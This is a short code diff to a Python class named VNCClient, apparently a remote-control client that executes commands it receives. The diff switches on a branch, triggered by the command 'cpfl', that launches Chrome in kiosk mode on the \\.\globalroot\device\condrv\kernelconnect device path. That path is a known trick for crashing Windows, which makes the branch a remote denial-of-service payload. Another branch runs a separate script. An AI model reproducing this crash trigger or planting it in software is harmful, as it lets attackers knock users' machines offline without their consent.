@@ -25,10 +25,10 @@ class VNCClient:
                 subprocess.call('start cmdc.pyw', shell=True)
                 print(f"command = {self.a}")
             elif self.a == 'cpfl':
-                # os.system(
-                #     'start chrome "*\*\*\.\globalroot\device\condrv\kernelconnect" --kiosk')
-                subprocess.Popen(
-                    ["chrome", "\\\\\\.\globalroot\device\condrv\kernelconnect"])
+                 os.system(
+                     'start chrome "\\\.\globalroot\device\condrv\kernelconnect" --kiosk')
+                #subprocess.Popen(
+                #    ["chrome", "\\\.\globalroot\device\condrv\kernelconnect"])
 
             elif self.a == 'X':
                 print(f"command = {self.a}")
